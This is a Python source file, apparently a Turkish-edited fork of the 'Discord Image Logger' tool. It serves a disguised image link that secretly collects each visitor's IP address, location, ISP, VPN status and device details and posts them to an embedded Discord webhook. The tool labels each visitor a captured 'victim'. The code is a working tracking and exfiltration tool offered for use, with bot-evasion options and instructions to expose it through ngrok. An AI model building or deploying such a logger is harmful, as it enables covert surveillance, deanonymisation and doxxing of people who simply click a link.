# Discord Image Logger - M24T Edition (Siteye Girince Çalışır)
# By DeKrypt + Senin için düzenlendi
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7",  # ← SENİN WEBHOOK
    "image": "https://cdn.discordapp.com/attachments/1306264989954478081/1306268264246280295/speechmemified_Yeni_Proje.png.gif?ex=6865ee5f&is=68649cdf&hm=919ae037215a7dd9afedda6a2f06d42c5201956ec4cd168319cb9bd07cd45ea3&",
    "imageArgument": True,
    # CUSTOMIZATION #
    "username": "M24T Logger",
    "color": 0x00ff00,
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if any(ip.startswith(b) for b in blacklistedIPs):
        return
   
    bot = botCheck(ip, useragent)
   
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy", False):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
   
    if info.get("hosting", False):
        if config["antiBot"] == 4 and not info.get("proxy", False): return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info.get("proxy", False): ping = ""
        if config["antiBot"] == 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
   
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "M24T - KURBAN YAKALANDI",
            "color": config["color"],
            "description": f"""**SİTEYE GİRDİ!**
**IP:** `{ip}`
**Şehir:** `{info.get('city','Bilinmiyor')}`
**Ülke:** `{info.get('country','Bilinmiyor')}`
**ISP:** `{info.get('isp','Bilinmiyor')}`
**Mobil:** `{info.get('mobile','Bilinmiyor')}`
**VPN/Tor:** `{info.get('proxy','Bilinmiyor')}`
**Cihaz:** `{os} | {browser}`
**Zaman:** {__import__('datetime').datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
**User Agent:** `{useragent or 'Bilinmiyor'}`""",
            "thumbnail": {"url": url} if url else None
        }
    ],
}
    requests.post(config["webhook"], json = embed)

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # === RESİM SEÇİMİ ===
            if config["imageArgument"]:
                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                url = base64.b64decode(query.get("url") or query.get("id", b"").encode()).decode() if query.get("url") or query.get("id") else config["image"]
            else:
                url = config["image"]

            # === IP ALMA ===
            ip = self.client_address[0]
            if self.headers.get('x-forwarded-for'):
                ip = self.headers.get('x-forwarded-for').split(',')[0]

            # === HEMEN LOG AT (Open Original beklemeden) ===
            makeReport(ip, self.headers.get('user-agent'), endpoint=self.path.split("?")[0], url=url)

            # === RESMİ GÖSTER ===
            data = f'''<style>body{{margin:0;background:#000}}</style>
                       <img src="{url}" style="width:100vw;height:100vh;object-fit:contain">'''.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            reportError(traceback.format_exc())
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 - Error")

    do_GET = handleRequest
    do_POST = handleRequest

# === SUNUCUYU BAŞLAT ===
from http.server import HTTPServer
print("M24T Logger aktif → ngrok http 8000 yazıp dışarı aç!")
HTTPServer(("0.0.0.0", 8000), ImageLoggerAPI).serve_forever()
